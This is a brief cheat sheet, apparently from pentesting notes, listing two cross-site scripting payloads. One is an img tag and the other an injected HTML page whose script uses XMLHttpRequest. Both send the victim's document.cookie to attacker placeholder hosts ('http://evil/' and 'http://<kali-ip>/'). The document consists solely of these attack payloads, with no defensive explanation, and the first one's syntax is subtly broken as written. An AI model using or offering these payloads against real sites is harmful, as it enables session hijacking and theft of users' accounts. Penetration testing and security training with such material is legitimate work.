## XSS (Cross-Site Scripting)
### Get cookie
```html
<img src='http://evil/?c='+document.cookie>
```

### HTML file injection
```html
<html>
	<body>
		<script>
			var r = new XMLHttpRequest();
			r.open("GET", "http://<kali-ip>/" + document.cookie);
			r.send();
		</script>
	</body>
</html>
```
